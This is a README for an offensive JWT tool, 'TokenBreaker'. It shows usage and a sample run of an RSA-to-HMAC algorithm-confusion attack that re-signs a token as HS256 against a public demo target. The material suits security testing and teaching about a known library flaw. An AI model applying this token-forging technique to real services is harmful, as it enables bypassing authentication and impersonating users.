# TokenBreaker

Token Breaker is focused on 2 particular vulnerability related JWT tokens.

<ul>
  <li>1. The None Algorithm(Not pushed yet)</li>
  <li>2. RSAtoHMAC</li>
</ul>

Refer to <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" >this</a> link about insights of the vulnerability and how an attacker can forge the tokens

<h1>RSAtoHMAC Usage</h1>

<code><pre>
usage: RsaToHmac.py [-h] -t TOKEN -p PUBKEY

TokenBreaker: 1.RSAtoHMAC

optional arguments:
  -h, --help                        show this help message and exit

required arguments:
  -t TOKEN, --token TOKEN           JWT Token value
  -p PUBKEY, --pubkey PUBKEY        Path to Public key File

Example Usage: python RsatoHMAC.py -t [JWTtoken] -p [PathtoPublickeyfile]</pre></code>

<h1>Output</h1>

<code><pre>
./RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUzNzUxODczMiwiZXhwIjoxNTM3NTE4ODUyLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.GwWRgb31V7OaxFt9wMd8LlLWWi4Z3zJ4NL7k38yz2mRYzKht1cFYrsxQv4DJdGLwV6D6L08iwF7_J90usGnJoLw8OLVUZvcDRH8rgGtpICSjhv1qaWiHW4-Gcqet4NieJLuvZzJn2imV2-x5TUDJJICKUaj183EvuJTOnjWuD0-ieT3ixhXbm0-E_9LqsGIUJrRQZfPkFOgpH8OLaJYscJwUghWOEphYV-jeek91Qu3TJkeXUuIUUuCF_l6x3eIHheQ0eYLuFc7Ug85HFWemeQ4rK7kMr8sDd3YKnFwZIoDPF6gnnr3lNOydDbpjn-KHnu1oU0E2zk1NIgHPs4TVww -p /tmp/pub
Decoded Header value is : {"typ":"JWT","alg":"RS256"}
Decode Payload value is : {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1537518732,"exp":1537518852,"data":{"hello":"world"}}
Enter your header Value: {"typ":"JWT","alg":"HS256"}
Enter your payload value: {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1537518732,"exp":1537518852,"data":{"hello":"world"}}
Successfully encoded Token: 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUzNzUxODczMiwiZXhwIjoxNTM3NTE4ODUyLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.aZ03C84GU7WfIFsyvRzr9NUhtDQttOvA6CW5fUxGXmU
</pre></code>

<p>Try out this vulnerability <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php?">here</a></p>

